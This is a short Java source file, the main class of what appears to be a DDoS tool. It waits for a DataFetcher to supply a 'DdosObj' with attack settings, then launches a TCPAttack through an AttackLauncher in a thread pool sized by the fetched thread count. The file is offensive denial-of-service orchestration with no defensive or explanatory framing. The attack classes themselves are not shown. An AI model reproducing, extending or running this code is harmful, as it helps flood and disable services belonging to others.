import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class Main {

    private DataFetcher df;
    private AttackLauncher attackLauncher;
    private TCPAttack tcpAttack;
    private boolean attacking = false;


    public static void main(String[] args) throws IOException {

        DataFetcher dff = new DataFetcher();


        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.submit(dff.task);
        while(dff.getDdosObj() == null){
            try {
                Thread.sleep(500);
                System.out.println("Main thread sleeping");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        System.out.println("This is: " + dff.getDdosObj());
        TCPAttack tcp = new TCPAttack(dff.getDdosObj());
        AttackLauncher att = new AttackLauncher(tcp);
        ExecutorService attService = Executors.newFixedThreadPool(dff.getDdosObj().getThreadCount());
        attService.submit(att.task);

    }
}
